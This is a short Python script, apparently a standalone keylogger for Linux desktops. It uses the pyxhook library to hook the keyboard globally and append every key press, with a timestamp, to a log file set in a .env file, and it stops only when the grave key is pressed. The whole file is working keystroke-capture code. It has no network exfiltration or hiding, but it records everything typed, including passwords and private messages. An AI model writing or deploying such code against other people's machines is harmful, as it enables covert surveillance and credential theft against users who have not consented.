import pyxhook
import datetime
import os
import shutil

from decouple import config

env_file = "./.env"
env_file_example = "./.env.example"


if not os.path.exists(env_file):
    print(".env file doesn't exists. Using default config from .env.example")
    shutil.copyfile(env_file_example, env_file)

log_file = config('LOG_LOCATION')
ascii_key_code = config('GRAVE_KEY_ASCII')

if not os.path.exists(log_file):
    os.mknod(log_file)


# this function is called everytime a key is pressed.
def OnKeyPress(event):
    x = datetime.datetime.now()
    data = str(x.strftime("%c")) + " : " + event.Key
    fob = open(log_file, 'a')
    fob.write(data)
    fob.write('\n')
    if event.Ascii == int(ascii_key_code):
        fob.close()
        new_hook.cancel()


# instantiate HookManager class
new_hook = pyxhook.HookManager()
# listen to all keystrokes
new_hook.KeyDown = OnKeyPress
# hook the keyboard
new_hook.HookKeyboard()
# start the session
new_hook.start()
